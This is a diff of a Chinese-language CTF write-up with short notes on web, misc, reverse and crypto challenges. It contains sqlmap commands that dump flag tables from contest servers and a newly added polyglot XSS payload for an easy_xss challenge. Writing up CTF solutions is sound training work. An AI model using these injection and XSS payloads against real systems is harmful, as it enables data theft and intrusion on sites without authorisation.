@@ -1,5 +1,7 @@
 # web
+
 ## 欢迎来到Web安全
+
 查看源码搜索 swpu 得到flag
 
 ## easy_sql
@@ -9,6 +11,7 @@ sqlmap -u "http://175.24.172.136:30083/?wllm=1" -D test_db -T test_tb -C fllaag 
 
 sqlmap -u "http://175.24.172.136:30071/?wllm=1" -D test_peng -T test_2tb -C ffflllaaaggg --dump # 错误
 ```
+
 ## happy_rce
 
 ```php
@@ -71,7 +74,9 @@ if (!preg_match('/[^0-9]/',$_GET['jiangnaij'])){
 else echo "输入一个数，这个数md5加密后前六位全是6！";
 相等吗？？？
 ```
+
 用下面的脚本爆破得到md5加密后前六位全是6的数：
+
 ```python
 # -*- coding: utf-8 -*-
 import multiprocessing
@@ -127,44 +132,50 @@ flask 2.2.2 py3 多半是模板注入 gunicorn20.0.4请求走私
 
 ## ez_upload
 
-
 ## easy_java
 
-
 # misc
+
 ## all in base
 
 baseX Python爆破求解
 
+## easy_xss
+
+hackbar 的 payload
+
+`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert("flag") )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert("flag")//>\x3e`
+
 # reverse
+
 ## 一道简单的签到
+
 记事本打开搜索 swpu 得到flag
+
 ## xor
 
 ## SUPX
 
 ## 64base
 
-
 ## swpu_easy_android
-反编译得到 check 类，在 idea 中运行测试得到密码为 `f53720bd5d9f07a8dc1028df48b8e1bb` ，登录进下一个界面。
 
+反编译得到 check 类，在 idea 中运行测试得到密码为 `f53720bd5d9f07a8dc1028df48b8e1bb` ，登录进下一个界面。
 
 # crypto
 
 ## 善哉善哉
 
-
 # All in Base
+
 python跑了下，有如下字符串，猜测为 base64 变式，构造的支付与下面一致，研究对应算法
 
 ```python
 ['0', '1', '2', '3', '4', '5', '=', 'A', 'D', 'E', 'G', 'I', 'M', 'N', 'O', 'Q', 'R', 'T', 'U', 'V', 'W', 'Y', 'Z', 'c', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'x', 'y', 'z']
 ```
 
-
-
 ## AES
+
 网站 [AES在线加密解密工具 - MKLab在线工具](https://www.mklab.cn/utils/aes) 解密，选项设置为 nopadding 128位。
 
 ## 爆破MD5
@@ -192,4 +203,5 @@ print("over")
 ```
 
 ## Welcome to Modern Cryptography
+
 直接用 [在线RSA私钥加密解密、RSA private key encryption and decryption--查错网 (chacuo.net)](http://tool.chacuo.net/cryptrsaprikey) 解密
